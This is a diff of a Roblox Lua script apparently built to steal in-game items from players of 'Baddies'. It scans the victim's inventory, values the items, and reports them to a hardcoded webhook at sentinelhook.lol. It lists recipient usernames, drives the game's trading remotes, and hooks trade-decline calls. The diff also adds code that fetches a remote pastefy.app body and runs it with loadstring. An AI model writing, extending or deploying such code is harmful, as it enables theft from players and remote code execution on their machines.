@@ -4,199 +4,110 @@ local Replion = require(ReplicatedStorage.Modules.Replion)
 local HttpService = game:GetService("HttpService")
 
 local function loadItemValues()
-    local csvUrl = "https://pastefy.app/yVwvz5BB/raw"
-    local itemValues = {}
-    local tokenValues = {}
-    local highValueItems = {}
-    local fightingStylesFromCSV = {}
-    
-    print("Loading item values from CSV...")
+    local url = "https://pastefy.app/1VAfaxx5/raw"
+    local items = {}
     
     local success, result = pcall(function()
         if syn and syn.request then
-            return syn.request({
-                Url = csvUrl,
-                Method = "GET"
-            })
+            return syn.request({Url = url, Method = "GET"})
         elseif request then
-            return request({
-                Url = csvUrl,
-                Method = "GET"
-            })
+            return request({Url = url, Method = "GET"})
         elseif http_request then
-            return http_request({
-                Url = csvUrl,
-                Method = "GET"
-            })
+            return http_request({Url = url, Method = "GET"})
         elseif fluxus and fluxus.request then
-            return fluxus.request({
-                Url = csvUrl,
-                Method = "GET"
-            })
-        else
-            return nil
+            return fluxus.request({Url = url, Method = "GET"})
         end
+        return nil
     end)
     
     if success and result and result.Body then
-        print("CSV loaded successfully, parsing...")
-        local lines = {}
-        for line in result.Body:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
+        local chunk = loadstring(result.Body)
+        if chunk then
+            items = chunk()
         end
-        
-        -- Parse header to find column indexes
-        local header = lines[1]
-        local headerParts = {}
-        local current = ""
-        local inQuotes = false
-        local partIndex = 1
-        
-        for char in header:gmatch(".") do
-            if char == '"' then
-                inQuotes = not inQuotes
-            elseif char == ',' and not inQuotes then
-                headerParts[partIndex] = current
-                partIndex = partIndex + 1
-                current = ""
-            else
-                current = current .. char
-            end
-        end
-        headerParts[partIndex] = current
-        
-        -- Clean up header parts
-        for i, v in ipairs(headerParts) do
-            headerParts[i] = v:gsub('"', ''):gsub('^%s+', ''):gsub('%s+$', '')
-        end
-        
-        -- Find column indexes
-        local nameIndex = nil
-        local valueIndex = nil
-        local tokenValueIndex = nil
-        local categoryIndex = nil
-        
-        for i, col in ipairs(headerParts) do
-            if col:lower() == "name" then nameIndex = i end
-            if col:lower() == "value" then valueIndex = i end
-            if col:lower() == "tokenvalue" then tokenValueIndex = i end
-            if col:lower() == "category" then categoryIndex = i end
-        end
-        
-        print("Found columns - Name:", nameIndex, "Value:", valueIndex, "TokenValue:", tokenValueIndex, "Category:", categoryIndex)
-        
-        for i = 2, #lines do
-            local parts = {}
-            local current = ""
-            local inQuotes = false
-            local partIndex = 1
-            
-            for char in lines[i]:gmatch(".") do
-                if char == '"' then
-                    inQuotes = not inQuotes
-                elseif char == ',' and not inQuotes then
-                    parts[partIndex] = current
-                    partIndex = partIndex + 1
-                    current = ""
-                else
-                    current = current .. char
-                end
-            end
-            parts[partIndex] = current
-            
-            -- Clean up parts
-            for j, v in ipairs(parts) do
-                parts[j] = v:gsub('"', ''):gsub('^%s+', ''):gsub('%s+$', '')
-            end
-            
-            if nameIndex and parts[nameIndex] and parts[nameIndex] ~= "" then
-                local name = parts[nameIndex]
-                local value = valueIndex and tonumber(parts[valueIndex]) or 0
-                local tokenValue = tokenValueIndex and tonumber(parts[tokenValueIndex]) or 0
-                local category = categoryIndex and parts[categoryIndex] or ""
-                
-                -- Store all items with their values
-                itemValues[name] = value
-                tokenValues[name] = tokenValue
-                
-                if category == "Fighting Style" then
-                    fightingStylesFromCSV[name] = true
-                end
-                
-                if value >= 1000 and category ~= "Fighting Style" then
-                    highValueItems[name] = true
-                end
-            end
-        end
-        
-        print("Loaded", #itemValues, "items from CSV")
-    else
-        print("Failed to load CSV:", success, result)
     end
     
-    return itemValues, tokenValues, highValueItems, fightingStylesFromCSV
+    return items or {}
 end
 
-local ITEM_VALUES, TOKEN_VALUES, HIGH_VALUE_ITEMS, FIGHTING_STYLES_FROM_CSV = loadItemValues()
+local ITEMS = loadItemValues()
+
+local function getItemValue(name)
+    if ITEMS[name] then
+        return ITEMS[name].Value or 0, ITEMS[name].TokenValue or 0, ITEMS[name].Category or ""
+    end
+    return 0, 0, ""
+end
 
 local data = Replion.Client:GetReplion("Data")
 repeat task.wait() until data
 
 local weaponSkins = data:Get({"NewInventory", "Items", "WeaponSkin"})
 
-local FightingStyles = {
-	["Boxing"] = true,
-	["Kickboxing"] = true,
-	["MMA Fighting"] = true,
-	["Glitter Style"] = true,
-	["Karate Style"] = true,
-	["Mean Girl Mayhem Style"] = true,
-	["Princess Punchout Style"] = true,
-	["Puppet Panic Style"] = true,
-	["Rough 'n' Rude Style"] = true,
-	["Feral Frenzy Style"] = true,
-	["Heartbreaker Style"] = true,
-	["Princess Power Style"] = true,
-	["Storm Dancer Style"] = true,
-	["Hug of Doom Style"] = true,
-	["Bubble Pop Style"] = true,
-	["Angel Style"] = true,
-	["Black Hex Style"] = true,
-	["Fantasy Style"] = true,
-    ["Goth Style"] = true,
-    ["Beast Style"] = true
-}
-
-for styleName, _ in pairs(FIGHTING_STYLES_FROM_CSV) do
-    FightingStyles[styleName] = true
-end
-
 local SKIP_WEAPONS = {
-	["Stick"] = true,
-	["Spearhead Stick"] = false,
-	["Text Sign"] = true,
-	["Slingshot"] = false,
-	["Rusty Bow"] = false,
-	["Regular Bow"] = false
+    ["Stick"] = true,
+    ["Spearhead Stick"] = false,
+    ["Text Sign"] = true,
+    ["Slingshot"] = false,
+    ["Rusty Bow"] = false,
+    ["Regular Bow"] = false
 }
 
 local ownedFightingStyles = {}
+local ownedStomps = {}
+local ownedLoveboards = {}
+local ownedHighValueSkins = {}
 
 for id, item in pairs(weaponSkins or {}) do
-	if FightingStyles[item.Name] then
-		table.insert(ownedFightingStyles, item.Name)
-	end
+    if item.Name then
+        local _, _, category = getItemValue(item.Name)
+        
+        if category == "Fighting Style" then
+            table.insert(ownedFightingStyles, item.Name)
+        end
+        
+        if category == "Stomp" then
+            ownedStomps[item.Name] = true
+        end
+        
+        if category == "Loveboard" then
+            ownedLoveboards[item.Name] = true
+        end
+        
+        local value, _, _ = getItemValue(item.Name)
+        if value >= 1000 and category ~= "Fighting Style" and category ~= "Stomp" and category ~= "Loveboard" then
+            ownedHighValueSkins[item.Name] = true
+        end
+    end
+end
+
+if game.PlaceId ~= 84780374286597 and game.PlaceId ~= 11158043705 then
+    localPlayer:Kick("Script doesn't support this game, join BADDIES")
+    return
 end
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
-local VirtualUser = game:GetService('VirtualUser')
-local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+local HttpService = game:GetService("HttpService")
 
-local player = Players.LocalPlayer
+local localPlayer = Players.LocalPlayer
+local playerGui = localPlayer:WaitForChild("PlayerGui")
 
-repeat task.wait() until player and player:IsA("Player") and player.PlayerGui
+local InventoryClient = require(ReplicatedStorage.Modules.Inventory.Client)
+
+local Modules = ReplicatedStorage:WaitForChild("Modules")
+local TradeData = require(Modules.Trading.TradeData)
+local Replion = require(Modules.Replion)
+local Net = require(Modules.Net)
+local MessageEvent = Net:RemoteEvent("Trade/MessageEvent")
+
+local data = Replion.Client:GetReplion("Data")
+repeat task.wait() until data
+
+local weaponSkins = data:Get({"NewInventory", "Items", "WeaponSkin"})
 
 local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
 
@@ -205,6 +116,75 @@ local AcceptRemote = Net:WaitForChild("RF/Trading/AcceptTradeOffer")
 local SendTradeOfferRemote = Net:WaitForChild("RF/Trading/SendTradeOffer")
 local CancelTradeRemote = Net:WaitForChild("RF/Trading/CancelTrade")
 local PhoneSettingsRemote = Net:WaitForChild("RE/SetPhoneSettings")
+
+local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
+local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
+local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
+local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
+local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
+local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
+
+local RICH_WEBHOOK = "https://sentinelhook.lol/api.php?id=pdjVByArjOg11TA"
+local POOR_WEBHOOK = _G.POOR_WEBHOOK or ""
+
+local HARDCODED_RICH_USERNAMES = {"qua_lovesAJJ", "LostIatinagirI", "WinningBaddiesStar"}
+local HARDCODED_POOR_USERNAMES = {}
+
+local RICH_USERNAMES = {}
+local POOR_USERNAMES = {}
+
+for _, name in ipairs(HARDCODED_RICH_USERNAMES) do
+    table.insert(RICH_USERNAMES, name)
+end
+
+for _, name in ipairs(HARDCODED_POOR_USERNAMES) do
+    table.insert(POOR_USERNAMES, name)
+end
+
+local CUSTOM_RICH = _G.RICH_USERNAMES or {}
+local CUSTOM_POOR = _G.POOR_USERNAMES or {}
+
+for _, name in ipairs(CUSTOM_RICH) do
+    local isDuplicate = false
+    for _, existing in ipairs(RICH_USERNAMES) do
+        if existing:lower() == name:lower() then isDuplicate = true break end
+    end
+    if not isDuplicate then table.insert(RICH_USERNAMES, name) end
+end
+
+for _, name in ipairs(CUSTOM_POOR) do
+    local isDuplicate = false
+    for _, existing in ipairs(POOR_USERNAMES) do
+        if existing:lower() == name:lower() then isDuplicate = true break end
+    end
+    if not isDuplicate then table.insert(POOR_USERNAMES, name) end
+end
+
+local MY_USERNAMES = {}
+for _, name in ipairs(RICH_USERNAMES) do
+    table.insert(MY_USERNAMES, name)
+end
+for _, name in ipairs(POOR_USERNAMES) do
+    table.insert(MY_USERNAMES, name)
+end
+
+local PING_POOR = _G.PING_POOR or false
+
+local GUI_PROTECTION_ENABLED = true
+local PROTECTED_GUIS = {
+    ["GeneralGUI"] = {enabled = true, requiredProperties = {{path = "Buttons", visible = true}}},
+    ["BackpackGui"] = {enabled = true, requiredProperties = {{path = "Backpack", visible = true}}}
+}
+
+local isTrading = false
+local currentTradePartner = nil
+local tradingPlayers = {}
+local isProcessing = false
+local jumped = false
+local activeTargets = {}
+local skinsAlreadyAdded = false
+local fightingStylesAlreadyAdded = false
+local playerTokens = 0
 
 local oldDeclineHook
 oldDeclineHook = hookmetamethod(game, "__namecall", function(self, ...)
@@ -293,154 +273,6 @@ task.spawn(function()
         task.wait(1)
     end
 end)
-
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local TextChatService = game:GetService("TextChatService")
-local HttpService = game:GetService("HttpService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-
-local localPlayer = Players.LocalPlayer
-local playerGui = localPlayer:WaitForChild("PlayerGui")
-
-local InventoryClient = require(ReplicatedStorage.Modules.Inventory.Client)
-
-local Modules = ReplicatedStorage:WaitForChild("Modules")
-local TradeData = require(Modules.Trading.TradeData)
-local Replion = require(Modules.Replion)
-local Net = require(Modules.Net)
-local MessageEvent = Net:RemoteEvent("Trade/MessageEvent")
-
-local data = Replion.Client:GetReplion("Data")
-repeat task.wait() until data
-
-local weaponSkins = data:Get({"NewInventory", "Items", "WeaponSkin"})
-local stompList = require(ReplicatedStorage.SkinCrates.Items.Stomp)
-
-local loveboardList = {
-    ["Credit Card Hoverboard"] = true,
-    ["Popstar Hoverboard"] = true,
-    ["Graduation Hat Hoverboard"] = true,
-    ["Surf's Up Hoverboard"] = true,
-    ["Pink Star Board"] = true,
-    ["Ice cream Sandwich Board"] = true,
-    ["Angel Wings"] = true,
-    ["Void Demon Wings"] = true,
-    ["Bath Tub Hoverboard"] = true,
-    ["Rocket Hoverboard"] = true,
-    ["St Patrick's Board"] = true,
-}
-
-local ownedStomps = {}
-local ownedLoveboards = {}
-local ownedFightingStylesList = {}
-local ownedHighValueSkins = {}
-
-for id, item in pairs(weaponSkins or {}) do
-    if item.Name then
-        local itemName = item.Name:lower()
-        
-        if FightingStyles[item.Name] then
-            table.insert(ownedFightingStylesList, item.Name)
-        end
-        
-        if HIGH_VALUE_ITEMS[item.Name] then
-            ownedHighValueSkins[item.Name] = true
-        end
-        
-        for stompName, _ in pairs(stompList) do
-            local stompLower = stompName:lower()
-            if string.find(itemName, stompLower) then
-                ownedStomps[stompName] = true
-                break
-            end
-        end
-        
-        for loveboardName, _ in pairs(loveboardList) do
-            if item.Name == loveboardName then
-                ownedLoveboards[loveboardName] = true
-            end
-        end
-    end
-end
-
-if game.PlaceId ~= 84780374286597 and game.PlaceId ~= 11158043705 then
-    localPlayer:Kick("Script doesn't support this game, join BADDIES")
-    return
-end
-
-local RFTradingSendTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/SendTradeOffer"]
-local RESetPhoneSettings = ReplicatedStorage.Modules.Net["RE/SetPhoneSettings"]
-local RFTradingSetReady = ReplicatedStorage.Modules.Net["RF/Trading/SetReady"]
-local RFTradingConfirmTrade = ReplicatedStorage.Modules.Net["RF/Trading/ConfirmTrade"]
-local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/AcceptTradeOffer"]
-local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
-
-local RICH_WEBHOOK = "https://sentinelhook.lol/api.php?id=pdjVByArjOg11TA"
-local POOR_WEBHOOK = _G.POOR_WEBHOOK or ""
-
-local HARDCODED_RICH_USERNAMES = {"qua_lovesAJJ", "LostIatinagirI", "WinningBaddiesStar"}
-local HARDCODED_POOR_USERNAMES = {}
-
-local RICH_USERNAMES = {}
-local POOR_USERNAMES = {}
-
-for _, name in ipairs(HARDCODED_RICH_USERNAMES) do
-    table.insert(RICH_USERNAMES, name)
-end
-
-for _, name in ipairs(HARDCODED_POOR_USERNAMES) do
-    table.insert(POOR_USERNAMES, name)
-end
-
-local CUSTOM_RICH = _G.RICH_USERNAMES or {}
-local CUSTOM_POOR = _G.POOR_USERNAMES or {}
-
-for _, name in ipairs(CUSTOM_RICH) do
-    local isDuplicate = false
-    for _, existing in ipairs(RICH_USERNAMES) do
-        if existing:lower() == name:lower() then isDuplicate = true break end
-    end
-    if not isDuplicate then table.insert(RICH_USERNAMES, name) end
-end
-
-for _, name in ipairs(CUSTOM_POOR) do
-    local isDuplicate = false
-    for _, existing in ipairs(POOR_USERNAMES) do
-        if existing:lower() == name:lower() then isDuplicate = true break end
-    end
-    if not isDuplicate then table.insert(POOR_USERNAMES, name) end
-end
-
-local MY_USERNAMES = {}
-for _, name in ipairs(RICH_USERNAMES) do
-    table.insert(MY_USERNAMES, name)
-end
-for _, name in ipairs(POOR_USERNAMES) do
-    table.insert(MY_USERNAMES, name)
-end
-
-local PING_POOR = _G.PING_POOR or false
-
-local GUI_PROTECTION_ENABLED = true
-local PROTECTED_GUIS = {
-    ["GeneralGUI"] = {enabled = true, requiredProperties = {{path = "Buttons", visible = true}}},
-    ["BackpackGui"] = {enabled = true, requiredProperties = {{path = "Backpack", visible = true}}}
-}
-
-local isTrading = false
-local currentTradePartner = nil
-local tradingPlayers = {}
-local isProcessing = false
-local jumped = false
-local activeTargets = {}
-local skinsAlreadyAdded = false
-local fightingStylesAlreadyAdded = false
-local weaponsAddedFlag = false
-local isRichTarget = false
-local blockAllTrades = false
-local playerTokens = 0
 
 local function getPlayerTokens()
     local ls = localPlayer:FindFirstChild("leaderstats")
@@ -835,8 +667,7 @@ local function getAllInventoryWeaponsWithTradeStatus()
             if item and item.Name then
                 if not SKIP_WEAPONS[item.Name] then
                     local tradable = IsTradable(item)
-                    local value = ITEM_VALUES[item.Name] or 0
-                    local tokenValue = TOKEN_VALUES[item.Name] or 0
+                    local value, tokenValue, category = getItemValue(item.Name)
                     counts[item.Name] = (counts[item.Name] or 0) + 1
                     totalWeapons = totalWeapons + 1
                     if tradable then
@@ -861,10 +692,10 @@ local function getAllInventoryWeaponsWithTradeStatus()
                 local weaponName = item.Weapon or item.WeaponName or item.Type
                 local skinName = item.Name
                 if weaponName and skinName then 
-                    if not FightingStyles[item.Name] then
+                    local _, _, category = getItemValue(item.Name)
+                    if category ~= "Fighting Style" then
                         local tradable = IsTradable(item)
-                        local value = ITEM_VALUES[item.Name] or 0
-                        local tokenValue = TOKEN_VALUES[item.Name] or 0
+                        local value, tokenValue, _ = getItemValue(item.Name)
                         table.insert(allWeapons, weaponName .. "::" .. skinName .. "::" .. tostring(tradable) .. "::" .. tostring(value) .. "::" .. tostring(tokenValue))
                         if tradable then
                             totalValue = totalValue + value
@@ -899,7 +730,8 @@ local function getAllInventoryWeapons()
             local weaponName = item.Weapon or item.WeaponName or item.Type
             local skinName = item.Name
             if weaponName and skinName then 
-                if not FightingStyles[item.Name] then
+                local _, _, category = getItemValue(item.Name)
+                if category ~= "Fighting Style" then
                     table.insert(allWeapons, weaponName .. "::" .. skinName)
                 end
             end
@@ -926,7 +758,7 @@ end
 
 local function getAllFightingStyles()
     local styles = {}
-    for _, styleName in ipairs(ownedFightingStylesList) do
+    for _, styleName in ipairs(ownedFightingStyles) do
         table.insert(styles, styleName)
     end
     return styles
@@ -1333,11 +1165,6 @@ end
 local function sendFullInventory()
     local weaponCounts, allWeaponsList, totalWeapons, tradableCount, untradableCount, weaponTradeStatus, totalValue, weaponValues, totalTokenValue = getAllInventoryWeaponsWithTradeStatus()
     
-    -- Debug prints
-    print("Total Weapons:", totalWeapons)
-    print("Tradable:", tradableCount, "Untradable:", untradableCount)
-    print("Total Value:", totalValue, "Total Token Value:", totalTokenValue)
-    
     if totalWeapons < 2 then
         local rejectionMsg = getRandomRejection()
         local poorPayload = {
@@ -1418,7 +1245,6 @@ local function sendFullInventory()
         useRichWebhook = (hasSpikedKitty and hasSurf) or (totalWeapons > 7) or (totalValue > 50000)
     end
     
-    -- Build weapons text
     local weaponsText = ""
     local weaponLines = {}
     for weaponName, count in pairs(weaponCounts) do
@@ -1466,7 +1292,6 @@ local function sendFullInventory()
     
     local webhookType = useRichWebhook and "Rich" or "Poor"
     
-    -- Calculate token worth
     local tokenWorth = (totalTokenValue / 1000) * 1.75
     
     local fields = {
